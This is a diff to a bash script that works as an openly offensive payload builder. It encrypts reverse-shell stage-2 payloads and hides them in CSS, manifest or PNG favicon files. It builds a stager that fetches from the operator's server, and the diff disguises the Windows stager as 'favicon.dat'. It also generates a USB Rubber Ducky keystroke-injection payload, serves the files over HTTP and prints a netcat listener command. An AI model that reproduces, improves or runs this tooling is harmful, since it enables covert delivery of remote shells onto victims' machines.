@@ -1,12 +1,6 @@
 #!/bin/bash
-# Payload Generator Script
-# This script generates a payload based on user input and serves it via a web server.
-# It supports multiple operating systems and delivery methods.
-# Usage: ./run.sh
-
 set -euo pipefail
 
-# --------- [ BANNER ] ---------
 cat <<'BANNER'
    ____  _           _       _     ____                                      
   |  _ \| |__   ___ | |_ ___| |__ |  _ \  ___  ___ ___  _ __ ___  ___  _ __  
@@ -16,7 +10,6 @@ cat <<'BANNER'
 BANNER
 echo
 
-# --------- [ CHECK DEPENCIES ] ---------
 check_dep() {
   for cmd in "$@"; do
     command -v "$cmd" &>/dev/null || { echo -e "\e[1;31m[ERROR]\e[0m Missing dependency: $cmd"; exit 1; }
@@ -24,14 +17,11 @@ check_dep() {
 }
 check_dep python3 lsof nc
 
-# --------- [ Ctrl+C ] ---------
 trap 'log "Interrupted. Exiting."; exit 1' INT
 
-# --------- [ LOG FUNCTION ] ---------
 log()   { echo -e "\e[1;32m[$(date +%H:%M:%S)] $1\e[0m"; }
 error() { echo -e "\e[1;31m[$(date +%H:%M:%S)] $1\e[0m" >&2; }
 
-# ----------------------[ SETTINGS ]-------------------------
 PROJECT_DIR="$(cd "$(dirname "${BASH_SOURCE[0]}")" && pwd)"
 cd "$PROJECT_DIR"
 
@@ -43,18 +33,12 @@ STAGERS_DIR="stagers"
 
 mkdir -p "$OUTPUT_DIR" "$WEB_DIR" "$PAYLOADS_DIR" "$STAGERS_DIR/config"
 
-# ---------------------[ GET NETWORK IP ]--------------------
 log "Available local IPv4 addresses:"
-
-# Filter only IPv4 addresses
 mapfile -t ip_list < <(hostname -I | tr ' ' '\n' | grep -E '^[0-9]+\.[0-9]+\.[0-9]+\.[0-9]+$')
-
-# Show options to the user
 for i in "${!ip_list[@]}"; do
     echo "  [$i] ${ip_list[$i]}"
 done
 
-# Safe input for IP index
 while true; do
     read -p "[*] Choose IP [index]: " ip_index
     if [[ "$ip_index" =~ ^[0-9]+$ ]] && (( ip_index >= 0 && ip_index < ${#ip_list[@]} )); then
@@ -76,8 +60,6 @@ PORT_SERVE="${PORT_SERVE:-8080}"
 echo "Reverse shell/payload port: $PORT_SHELL"
 echo "Web server port: $PORT_SERVE"
 
-
-# --------------------[ CHECK PORTS & KILL PROCESSES ]--------
 free_port() {
   local PORT=$1
   local PIDS
@@ -92,9 +74,9 @@ free_port() {
 free_port "$PORT_SHELL"
 free_port "$PORT_SERVE"
 
-# -------------[ OS & PAYLOAD & DELIVERY SELECTION ]----------
+# -------------[ OS Selection ]----------
 log "Choose target OS:"
-select OS in windows linux mac; do [[ -n "$OS" ]]; break; done
+select OS in linux windows mac; do [[ -n "$OS" ]]; break; done
 
 PAYLOAD_PATH="$PAYLOADS_DIR/$OS"
 if [[ ! -d "$PAYLOAD_PATH" ]]; then error "No payloads for $OS"; exit 1; fi
@@ -106,33 +88,28 @@ select PAYLOAD in "${PAYLOADS[@]}"; do [[ -n "$PAYLOAD" ]]; break; done
 log "Choose delivery method:"
 select DELIVERY in css manifest png; do [[ -n "$DELIVERY" ]]; break; done
 
-# ------------[ SELECT FILES BASED ON OS ]-------------------
-case "$OS" in
-  windows)
-    STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.ps1"
-    STAGER_FILE="$STAGERS_DIR/powershell/template.ps1"
-    FINAL_STAGE1="$OUTPUT_DIR/final_stage1.ps1"
-    FINAL_STAGE1_WEB="final_stage1.ps1"
-    ;;
-  linux)
-    STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.sh"
-    STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.sh"
-    FINAL_STAGE1="$OUTPUT_DIR/final_stage1.sh"
-    FINAL_STAGE1_WEB="final_stage1.sh"
-    ;;
-  mac)
-    STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.osascript"
-    STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.osascript"
-    FINAL_STAGE1="$OUTPUT_DIR/final_stage1.osascript"
-    FINAL_STAGE1_WEB="final_stage1.osascript"
-    ;;
-esac
+# ------------[ OS-specific paths ]-------------------
+if [[ "$OS" == "linux" ]]; then
+  STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.sh"
+  STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.sh"
+  FINAL_STAGE1="$OUTPUT_DIR/final_stage1.sh"
+  FINAL_STAGE1_WEB="final_stage1.sh"
+elif [[ "$OS" == "windows" ]]; then
+  STAGE2_RAW="$PAYLOADS_DIR/$OS/$PAYLOAD/raw.ps1"
+  STAGER_FILE="$PAYLOADS_DIR/$OS/$PAYLOAD/template.ps1"
+  FINAL_STAGE1="$OUTPUT_DIR/favicon.dat"
+  FINAL_STAGE1_WEB="favicon.dat"
+elif [[ "$OS" == "mac" ]]; then
+  error "Mac OS is not supported yet."
+  exit 2
+else
+  error "Unknown OS: $OS"
+  exit 2
+fi
 
-# -----------[ CHECK FILES EXIST ]---------------------------
 [[ -f "$STAGE2_RAW" ]] || { error "No raw payload $STAGE2_RAW"; exit 1; }
 [[ -f "$STAGER_FILE" ]] || { error "No stager template $STAGER_FILE"; exit 1; }
 
-# ----------[ GENERATE & ENCRYPT PAYLOAD ]-------------------
 TMP_PAYLOAD="$OUTPUT_DIR/tmp_raw_payload"
 cp "$STAGE2_RAW" "$TMP_PAYLOAD"
 sed -i "s/REPLACE_IP/$IP/g; s/REPLACE_PORT/$PORT_SHELL/g" "$TMP_PAYLOAD"
@@ -143,32 +120,48 @@ ENCODED_FILE="$OUTPUT_DIR/encrypted_stage2.txt"
 echo "$ENCODED" > "$ENCODED_FILE"
 rm -f "$TMP_PAYLOAD"
 
-# --------------[ DELIVERY EMBEDDING ]------------------------
 case "$DELIVERY" in
   css)      python3 tools/embed_in_css.py "$ENCODED_FILE" "$WEB_DIR/style.css" ;;
   manifest) python3 tools/embed_in_manifest.py "$ENCODED_FILE" "$WEB_DIR/manifest.json" ;;
   png)      python3 tools/embed_in_png.py "$ENCODED_FILE" "$WEB_DIR/favicon.png" "$WEB_DIR/favicon.png" ;;
 esac
 
-# ---------------[ REPLACE PLACEHOLDERS IN STAGER ]----------
+case "$DELIVERY" in
+  css)      DELIVERY_FILE="style.css" ;;
+  manifest) DELIVERY_FILE="manifest.json" ;;
+  png)      DELIVERY_FILE="favicon.png" ;;
+esac
+
+DELIVERY_URL="http://$IP:$PORT_SERVE/$DELIVERY_FILE"
+
 KEY=$(grep ENCRYPTION_KEY .env | cut -d= -f2 | tr -d '\r\n')
 KEY_HEX=$(echo -n "$KEY" | xxd -p | tr -d '\n')
-escape_for_sed() { echo "$1" | sed -e 's/[\/&]/\\&/g'; }
-ENCODED_ESCAPED=$(escape_for_sed "$ENCODED")
-KEY_HEX_ESCAPED=$(escape_for_sed "$KEY_HEX")
+KEY_HEX_ESCAPED=$(echo "$KEY_HEX" | sed -e 's/[\/&]/\\&/g')
 
-STAGER_CONTENT=$(sed -e "s/REPLACE_AES/${ENCODED_ESCAPED}/g" -e "s/REPLACE_KEY/${KEY_HEX_ESCAPED}/g" "$STAGER_FILE")
+STAGER_CONTENT=$(sed \
+  -e "s|REPLACE_DELIVERY|$DELIVERY|g" \
+  -e "s|REPLACE_URL|$DELIVERY_URL|g" \
+  -e "s|REPLACE_KEY|$KEY_HEX_ESCAPED|g" \
+  -e "s|REPLACE_AES|$ENCODED|g" \
+  "$STAGER_FILE")
 
 echo "$STAGER_CONTENT" > "$FINAL_STAGE1"
 cp "$FINAL_STAGE1" "$WEB_DIR/$FINAL_STAGE1_WEB"
 
+# Копируем encrypted_stage2 в web если windows
+# Windows: favicon.dat (Stage 1) уже ссылается на delivery payload
+if [[ "$OS" == "windows" ]]; then
+  case "$DELIVERY" in
+    css)      echo "[+] Embedded payload in style.css";;
+    manifest) echo "[+] Embedded payload in manifest.json";;
+    png)      echo "[+] Embedded payload in favicon.png";;
+  esac
+fi
+
+
 log "Generating Ducky payload..."
 python3 tools/generate_ducky.py "$IP" "$PORT_SERVE" 1000 "$OUTPUT_DIR/ducky_payload.txt" "$OS"
 
-# -------------------[ PORT CONTROL & SERVE ]------------------
-
-# Serve the web directory with python HTTP server in background,
-# redirect output to a log file for clean terminal view.
 serve_web() {
   cd "$WEB_DIR"
   log "Serving payloads at http://$IP:$PORT_SERVE"
@@ -178,12 +171,10 @@ serve_web() {
 }
 
 serve_web
-sleep 1  # Give server a moment to start
+sleep 1
 
-# --------- [ build_history.log ] ---------
 echo "[$(date)] $IP $PORT_SHELL $PORT_SERVE $OS $PAYLOAD $DELIVERY" >> build_history.log
 
-# -------------[ SAVE CONFIG ]-------------------------------
 cat > "$CONFIG_FILE" <<EOF
 {
   "last_used": {
@@ -204,22 +195,18 @@ cat > "$CONFIG_FILE" <<EOF
 }
 EOF
 
-# ---------------[ FINAL INFO BLOCK ]--------------------------
-
 log "Payload is ready and being served in background."
 log "----------------------------------------------------"
 log "  Serve URL:          http://$IP:$PORT_SERVE/"
-log "  Direct download:    http://$IP:$PORT_SERVE/$FINAL_STAGE1_WEB"
+log "  Direct download:    http://$IP:$PORT_SERVE/favicon.dat"
 log "  Ducky payload:      $OUTPUT_DIR/ducky_payload.txt"
 log "----------------------------------------------------"
 log "To listen for an incoming connection, run:"
 echo -e "\e[1;36mnc -lvnp $PORT_SHELL\e[0m"
 log "To stop the web server, run:"
-echo -e "\e[1;36mkill $SERVER_PID\e[0m"
+echo -e "\e[1;36mkill \$SERVER_PID\e[0m"
 log "HTTP server logs are saved to: output/http_server.log"
 
-
-# --- [ AUTO KILL HTTP SERVER ON EXIT ] ---
 cleanup() {
   if [[ -n "${SERVER_PID:-}" ]] && ps -p $SERVER_PID &>/dev/null; then
     log "Stopping HTTP server (PID $SERVER_PID)..."
